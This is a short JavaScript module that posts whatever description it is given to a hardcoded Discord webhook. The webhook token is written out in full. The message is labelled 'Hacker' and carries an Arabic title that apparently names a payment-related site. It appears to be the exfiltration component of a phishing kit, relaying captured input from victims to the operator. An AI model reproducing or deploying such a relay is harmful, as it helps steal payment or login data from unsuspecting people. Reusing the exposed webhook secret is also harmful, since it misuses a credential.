import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328517099097690182/i4UqbncD2YpWQuOMGl3TrUcaPNuJ4W7T3EuwvHXV7pwpwk28y8KeEzbQkTi_TF9jlFZP",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
